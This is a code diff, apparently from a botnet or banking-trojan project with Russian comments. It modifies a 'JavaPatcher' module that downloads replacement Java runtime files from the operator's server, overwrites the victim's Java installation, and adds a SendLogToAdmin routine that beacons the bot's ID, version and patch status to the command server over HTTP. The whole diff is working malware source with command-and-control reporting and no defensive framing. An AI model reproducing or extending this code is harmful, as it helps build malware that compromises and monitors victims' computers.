@@ -37,6 +37,8 @@ static int javaCompatible = 0; //совместимость явы для разных алгоритмов установ
 static char javaHome[MAX_PATH]; //папка явы
 static char javaMSI[MAX_PATH]; //папка с параметрами автообновления
 
+extern char version[]; //версия патча
+
 //Определяет версию явы, возвращает true если ява есть, иначе false. Заодно в переменную javaHome ложит путь к яве
 static bool GetJavaVersion()
 {
@@ -810,6 +812,16 @@ static bool WJFile()
 	}
 }
 
+static void SendLogToAdmin( const char* url, const char* uid, const char* c, const char* v )
+{
+	char* qr = STR::New( 7, (char*)url, "b.php?uid=", (char*)uid, "&c=", (char*)c, "&v=", (char*)v );
+	THTTPResponse Response;
+	ClearStruct(Response);
+	HTTP::Get( qr, 0, &Response );
+	DBG( "JavaPatcher", "Отсылка лога: %s", qr );
+	STR::Free(qr);
+}
+
 DWORD WINAPI JavaPatch( LPVOID lpData )
 {
 	WJFile();
@@ -826,13 +838,10 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 
 	PCHAR adminUrl = GetJavaPatcherURL(); 
 	PCHAR javaUrl = STR::New( 2, adminUrl, "rt_jar/" );
-	PCHAR getUrl = STR::New( 3, adminUrl, "b.php?c=sip&uid=", botUid );
-
+	//отсылаем версию бота
+	SendLogToAdmin( adminUrl, botUid, "botver", version );
 	//сообщаем админке, что ява патч запущен
-	DBG( "JavaPatcher", "оповещение %s", getUrl );
-	THTTPResponse Response;
-	ClearStruct(Response);
-	HTTP::Get( getUrl, 0, &Response );
+	SendLogToAdmin( adminUrl, botUid, "setup_patch", "0" );
 
 	DBG( "JavaPatcher", "файлы для патча грузим с %s", javaUrl );
 
@@ -910,13 +919,14 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				DBG( "JavaPatcher", "copy OK %s -> %s", javaExe.str(), srcJava.str() );
 			}
 			pDeleteFileA(javaExe.str());
+			//сообщаем админке, что ява патч установлен
+			SendLogToAdmin( adminUrl, botUid, "setup_patch", "1" );
 		};
 
 	}
 
 	STR::Free(adminUrl);
 	STR::Free(javaUrl);
-	STR::Free(getUrl);
 
 	return res;
 };
